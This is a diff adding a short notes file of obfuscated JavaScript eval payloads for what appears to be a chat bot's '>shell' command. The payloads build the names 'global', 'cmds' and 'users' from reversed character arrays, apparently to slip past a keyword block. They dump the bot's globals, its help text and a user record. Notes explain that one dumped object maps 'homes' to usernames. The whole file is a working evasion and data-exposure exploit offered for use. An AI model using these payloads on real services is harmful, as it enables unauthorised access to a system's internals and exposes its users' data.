@@ -1,0 +1,11 @@
+var a=eval(['l','a','b','o','l','g'].reverse().join(''));Object['k'+'e'+'y'+'s'](a) // Shows all Objects in global
+var a=eval(['s','d','m','c'].reverse().join(''));a // Shows contents of cmds
+
+>shell var a=eval(['s','r','e','s','u'].reverse().join(''));a['MTYwNjA']
+
+== global ==
+Keys: global,clearInterval,clearTimeout,setInterval,setTimeout,queueMicrotask,clearImmediate,setImmediate,callbacks,consolelog,app,cmds,banned,qtt,cooldowns,botdefaultnick,lasttimeoutid,creatohome,creatouuid,chomes,users,seed,letters,dip,dd
+-- users  --
+Object with each key being the home. The contents of each key is the corresponding username(s).
+-- cmds --
+String with the help command contents.
